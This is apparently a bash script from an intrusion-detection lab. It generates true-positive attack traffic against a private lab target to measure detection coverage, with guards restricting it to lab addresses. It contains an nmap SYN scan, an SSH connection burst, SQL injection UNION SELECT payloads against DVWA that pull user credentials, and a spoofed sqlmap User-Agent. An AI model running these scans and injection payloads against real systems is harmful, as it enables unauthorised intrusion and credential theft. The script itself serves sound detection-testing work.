#!/usr/bin/env bash
# TRUE-POSITIVE tests. Run from the ATTACKER host (2nd VM / Windows WSL / Kali itself in loopback mode).
# Usage: sudo ./03_attack_simulation.sh <target_ip> [http_port]       e.g. sudo ./03_attack_simulation.sh 192.168.57.128 80
# Writes a timeline CSV used by 05_collect_evidence.sh to compute detection coverage.
source "$(dirname "$0")/common.sh"
TARGET="${1:?usage: $0 <target_ip> [http_port]}"; PORT="${2:-80}"
is_lab_ip "$TARGET" || die "Target $TARGET is not a private/lab address. Refusing (authorization guard)."
read -r -p "Confirm $TARGET is YOUR lab asset and you are authorised to test it. Type LAB to continue: " C; [[ "$C" == "LAB" ]] || die "Aborted"
TL="$EVIDENCE_DIR/attack-timeline.csv"; [[ -f "$TL" ]] || echo "scenario,type,start_epoch,end_epoch,expected_sids,description" > "$TL"
mark() { # scenario type expected_sids description -- command...
  local sc="$1" ty="$2" ex="$3" ds="$4"; shift 5; local s e; info "[$sc] $ds"; s=$(date +%s); "$@" >/dev/null 2>&1 || true; e=$(date +%s)
  echo "$sc,$ty,$s,$e,\"$ex\",\"$ds\"" >> "$TL"; sleep 8   # gap so detection windows do not overlap
}
UA='Mozilla/5.0 (X11; Linux x86_64)'
sqli() { curl -s -m 5 -A "$UA" "http://$TARGET:$PORT/vulnerabilities/sqli/?id=$1&Submit=Submit"; }
ssh_burst() { for _ in $(seq 1 12); do timeout 3 ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o NumberOfPasswordPrompts=0 "labuser@$TARGET" true; sleep 0.3; done; }

mark TP1 TP "1000004"          "ICMP echo burst (10 pings / 2s)"                      -- ping -c 10 -i 0.2 "$TARGET"
mark TP2 TP "1000001"          "Nmap SYN scan ports 1-1024 (-T4)"                     -- nmap -sS -p 1-1024 -T4 -n --max-retries 0 "$TARGET"
mark TP3 TP "1000002"          "12 SSH connection attempts in ~4s"                    -- ssh_burst
mark TP4 TP "1000003;1000006"  "SQLi UNION SELECT with column list (DVWA)"            -- sqli "1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-"
mark TP5 TP "1000003;1000006"  "SQLi UNION ALL SELECT NULL enumeration"               -- sqli "1%27+UNION+ALL+SELECT+NULL%2CNULL--+-"
mark TP6 TP "1000005"          "sqlmap User-Agent"                                    -- curl -s -m 5 -A "sqlmap/1.7.2#stable (https://sqlmap.org)" "http://$TARGET:$PORT/"
ok "TP scenarios done. Timeline: $TL"
